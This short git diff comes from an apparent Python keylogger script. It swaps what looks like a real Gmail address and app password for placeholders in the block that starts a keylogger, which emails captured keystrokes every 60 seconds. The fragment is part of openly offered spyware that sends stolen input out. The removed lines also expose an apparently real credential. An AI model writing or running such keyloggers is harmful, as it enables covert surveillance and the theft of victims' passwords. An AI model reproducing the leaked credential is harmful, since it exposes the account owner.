@@ -92,8 +92,8 @@ if __name__ == "__main__":
     # IMPORTANT: For Gmail, you may need to enable "Less secure app access" 
     # or use an "App Password".
     # It's recommended to use a dedicated email account for this.
-    SENDER_EMAIL = "sydakifuddin47@gmail.com"  # Your email
-    SENDER_PASSWORD = "glkh fdpc rano bval"  # Your email app password
+    SENDER_EMAIL = "yourgmail@gmail.com"  # Your email
+    SENDER_PASSWORD = "app password"  # Your email app password
     
     print("[*] Starting Keylogger...")
     keylogger = Keylogger(60, SENDER_EMAIL, SENDER_PASSWORD) # Report every 60 seconds
